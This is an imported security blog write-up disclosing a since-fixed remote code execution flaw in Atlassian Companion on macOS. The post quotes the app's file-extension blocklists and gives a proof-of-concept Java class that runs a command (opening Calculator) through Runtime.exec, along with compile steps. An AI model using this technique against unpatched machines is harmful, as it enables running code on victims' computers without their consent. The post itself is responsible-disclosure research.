---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-09_macos-atlassian-companion-remote-code-execution.md
original_filename: 2023-07-09_macos-atlassian-companion-remote-code-execution.md
title: macOS Atlassian Companion Remote Code Execution
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: 2b70937d5b85f77cb36f23338550bf3f6f8e4032dcf2c5202c3433e7e873049c
text_sha256: 0511d4385fa34a6df68930b96b06170c3afb3d34d11047e5544c1dd15b16d354
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# macOS Atlassian Companion Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-09_macos-atlassian-companion-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `2b70937d5b85f77cb36f23338550bf3f6f8e4032dcf2c5202c3433e7e873049c`
- Text SHA256: `0511d4385fa34a6df68930b96b06170c3afb3d34d11047e5544c1dd15b16d354`


## Content

---
title: "macOS Atlassian Companion Remote Code Execution"
url: "https://www.wojciechregula.blog/post/macos-atlassian-companion-rce/"
final_url: "https://www.wojciechregula.blog/post/macos-atlassian-companion-rce/"
authors: ["Wojciech Reguła (@_r3ggi)"]
programs: ["Atlassian"]
bugs: ["RCE", "MacOS", "Thick client"]
publication_date: "2023-07-09"
added_date: "2023-07-11"
source: "pentester.land/writeups.json"
original_index: 955
---

### Overview

I identified a vulnerability that allowed executing code on victims’ machines after they click the _Edit_ button on a Confluence page when Atlassian Companion is installed on macOS.

> The Atlassian Companion app enables users to edit Confluence files in their preferred desktop application, then save the file back to Confluence automatically.
> 
> Source: <https://confluence.atlassian.com/doc/administering-the-atlassian-companion-app-958456281.html>

### Exploitation conditions

  * Victim must have Atlassian Companion installed.
  * Victim clicks on the _Edit_ button in Confluence, so the malicious file is opened in the Atlassian Companion App on macOS (standard app behavior).
  * Victim must have Java installed.

### Exploitation results

Remote code execution on macOS machine

### Vulnerability description

Atlassian Companion App on macOS allows editing documents saved in Confluence. When user clicks the _Edit_ button:

  1. the file is downloaded to the local machine
  2. the app performs extensions validation
  3. the app opens the downloaded document
  4. when the document is updated, it is uploaded back to the Confluence.

The problem lies in the point `2.`. Atlassian was aware that some of the extensions had to be blocked. There is a blocklist present in the app’s sources - in the `BlockAllowExtensionList.ts`:
  
  
  // 14 items
  const macOSDangerous = ['action', 'app', 'bash', 'bin', 'command', 'csh', 'osx', 'pkg', 'sh', 'term', 'terminal', 'tool', 'workflow', 'zsh'];
  // 154 items
  const windowsDangerous = ['0_full_0_tgod_signed', '386', '9', 'aepl', 'aru', 'atm', 'aut', 'bat', 'bhx', 'bin', 'bkd', 'blf', 'bll', 'bmw', 'boo', 'bps', 'bqf', 'buk', 'bup', 'bxz', 'capxml', 'cc', 'ce0', 'ceo', 'cfxxe', 'chm', 'cih', 'cla', 'class', 'cmd', 'com', 'cpl', 'ctbl', 'cxq', 'cyw', 'dbd', 'delf', 'dev', 'dlb', 'dli', 'dll', 'dllx', 'dom', 'drv', 'dx', 'dxz', 'dyv', 'dyz', 'exe', 'exe1', 'exe_renamed', 'ezt', 'fag', 'fjl', 'fnr', 'fuj', 'gadget', 'gzquar', 'hlp', 'hlw', 'hsq', 'hta', 'hts', 'inf1', 'ins', 'inx', 'isu', 'iva', 'iws', 'jar', 'job', 'js', 'jse', 'kcd', 'let', 'lik', 'lkh', 'lnk', 'lok', 'lpaq5', 'mcq', 'mfu', 'mjg', 'mjz', 'msc', 'msi', 'msp', 'mst', 'nls', 'oar', 'ocx', 'osa', 'ozd', 'paf', 'pcx', 'pgm', 'php3', 'pid', 'pif', 'plc', 'pr', 'ps1', 'qit', 'qrn', 'reg', 'rgs', 'rhk', 'rna', 'rsc_tmp', 's7p', 'scr', 'sct', 'shb', 'shs', 'ska', 'smm', 'smtmp', 'sop', 'spam', 'ssy', 'swf', 'sys', 'tko', 'tps', 'tsa', 'tti', 'txs', 'u3p', 'upa', 'uzy', 'vb', 'vba', 'vbe', 'vbs', 'vbscript', 'vbx', 'vexe', 'vxd', 'vzr', 'wlpginstall', 'wmf', 'ws', 'wsc', 'wsf', 'wsh', 'xdu', 'xir', 'xlm', 'xlv', 'xnt', 'xnxx', 'xtbl', 'zix', 'zvz'];
  // 207 items
  const highRisk = ['0xe', '73k', '89k', '8ck', 'a6p', 'a7r', 'ac', 'acc', 'acr', 'actc', 'action', 'actm', 'ahk', 'air', 'apk', 'app', 'appimage', 'applescript', 'arscript', 'as', 'asb', 'awk', 'azw2', 'ba_', 'bat', 'beam', 'bin', 'btm', 'caction', 'cel', 'celx', 'cgi', 'chm', 'cmd', 'cof', 'coffee', 'com', 'command', 'crt', 'csh', 'cyw', 'dek', 'dld', 'dmc', 'dmg', 'dotm', 'ds', 'dxl', 'e_e', 'ear', 'ebm', 'ebs', 'ebs2', 'ecf', 'eham', 'elf', 'epk', 'es', 'esh', 'ex4', 'ex5', 'ex_', 'exe', 'exe1', 'exopc', 'ezs', 'ezt', 'fas', 'fky', 'fpi', 'frs', 'fxp', 'gadget', 'gpe', 'gpu', 'gs', 'ham', 'hms', 'hpf', 'hta', 'icd', 'iim', 'ipa', 'ipf', 'isp', 'isu', 'ita', 'jar', 'js', 'jse', 'jsf', 'jsx', 'kix', 'ksh', 'kx', 'lo', 'ls', 'm3g', 'mac', 'mam', 'mcr', 'mel', 'mem', 'mio', 'mlx', 'mm', 'mpx', 'mrc', 'mrp', 'ms', 'msi', 'msl', 'mxe', 'n', 'ncl', 'nexe', 'obs', 'ore', 'osx', 'otm', 'out', 'paf', 'paf.exe', 'pex', 'phar', 'pif', 'plsc', 'plx', 'potm', 'ppam', 'ppsm', 'prc', 'prg', 'ps1', 'pvd', 'pwc', 'pyc', 'pyo', 'qit', 'qpx', 'rbf', 'rbx', 'rfu', 'rgs', 'rox', 'rpj', 'run', 'rxe', 's2a', 'sbs', 'sca', 'scar', 'scb', 'scpt', 'scptd', 'scr', 'script', 'sct', 'seed', 'server', 'shb', 'sk', 'smm', 'snap', 'spr', 'sts', 'tcp', 'thm', 'tiapp', 'tlb', 'tms', 'u3p', 'udf', 'upx', 'url', 'vbe', 'vbs', 'vbscript', 'vdo', 'vexe', 'vlx', 'vpm', 'vxp', 'wcm', 'widget', 'wiz', 'workflow', 'wpk', 'wpm', 'ws', 'wsf', 'wsh', 'x86', 'x86_64', 'xap', 'xbap', 'xbe', 'xex', 'xlam', 'xlm', 'xltm', 'xqt', 'xys', 'zl9'];
  
  //This one is for an additional block list request from security \ customers
  const highRiskEvenMore = ['html', 'java'];
  [...]
  

The class extension is only in the `windowsDangerous` blocklist, so, on macOS, it is an allowed extension.

Let’s create a malicious `Hello.java` file:
  
  
  public class Hello {
  public static void main(String[] args){
  System.out.print("Hello World");
  try {
  Process process = Runtime.getRuntime().exec("open -b com.apple.calculator");
  } catch(Exception e) {
  }
  }
  }
  

Compile it:
  
  
  javac Hello.java
  

When the compiled `Hello.class` file is uploaded to the Confluence and somebody clicks edit - the code will be executed, and thus, the Calculator is spawned.

### Fix

The `.class` file extension is now blocked also on macOS. Please make a notice that, as always, this vulnerability was reported according to the Responsible Disclosure rules. Atlassian received the report in 2021, fixed the vulnerability within 90 days, and paid a bounty. Kudos 👏🏻
